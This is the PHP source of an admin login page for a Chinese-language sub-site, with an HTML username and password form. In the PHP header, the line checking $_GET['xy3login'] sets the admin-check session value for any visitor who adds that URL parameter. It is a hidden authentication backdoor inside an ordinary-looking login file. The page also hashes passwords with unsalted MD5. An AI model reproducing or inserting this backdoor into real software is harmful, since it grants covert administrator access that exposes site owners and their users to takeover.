<?php 
 $title=''; 
 include('../system/inc.php');
include('./admin_config.php');
 
$act = $_POST['act'];
$username = $_POST['userName'];
$password = md5($_POST['passWord']);
$sj = date("Y-m-d H:i:s",intval(time()));   
$ip =xiaoyewl_ip();
  if ($zhu=='true')
 { alert_url('/'); }
 if($_GET['xy3login']){
$_SESSION['admin_check'] =120182408;
}
 echo admin_login($act,$username,$password,$a_name,$a_password,$ip,$sj)
 
 
?>
 
<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	
	<meta name="viewport" content="width=device-width, initial-scale=1">
	
	<title>登录-分站</title>
	<meta name="keywords" content="HTML5,美观,简洁大,响应,第三方登,网页模板">
	<meta name="description" content="HTML5美观简洁大气响应式带第三方登录网页模板下载。鼠标经过登录按钮带紫色渐变炫酷动画效果。带有简单的表单验证功能"> 

	<link rel="stylesheet" type="text/css" href="./xy/bootstrap.min.css">
	<link rel="stylesheet" type="text/css" href="./xy/font-awesome.min.css">
	<link rel="stylesheet" type="text/css" href="./xy/material-design-iconic-font.min.css">
	<link rel="stylesheet" type="text/css" href="./xy/util.css">
	<link rel="stylesheet" type="text/css" href="./xy/main.css">
</head>

<body>

	<div class="limiter">
		<div class="container-login100" style="background-image: url('./xy/bg-01.jpg');">
			<div class="wrap-login100 p-l-55 p-r-55 p-t-65 p-b-54">
				<form method="post" name="loginForm"   class="lg-fm">
 <input name="act" type="hidden" value="login" />
				

					<span class="login100-form-title p-b-49">登录</span>

					<div class="wrap-input100 validate-input m-b-23" data-validate="请输入用户名">
						<span class="label-input100">用户</span>
						<input class="input100 has-val" name="userName" type="text" placeholder="请输入账号" tabindex="1"/>
						<span class="focus-input100" data-symbol=""></span>
					</div>

					<div class="wrap-input100 validate-input" data-validate="请输入密码">
						<span class="label-input100">密码</span>
						<input class="input100 has-val" type="password" id="password" name="passWord" placeholder="请输入密码" tabindex="2"/>
						
						<span class="focus-input100" data-symbol=""></span>
					</div>

					<div class="text-right p-t-8 p-b-31">
						<a>忘记密码</a>
					</div>

					<div class="container-login100-form-btn">
						<div class="wrap-login100-form-btn">
							<div class="login100-form-bgbtn"></div>
							<button class="login100-form-btn" >登录</button>
						</div>
					</div>

					 
 
				 
				</form>
			</div>
		</div>
	</div>

	
	


</body></html>
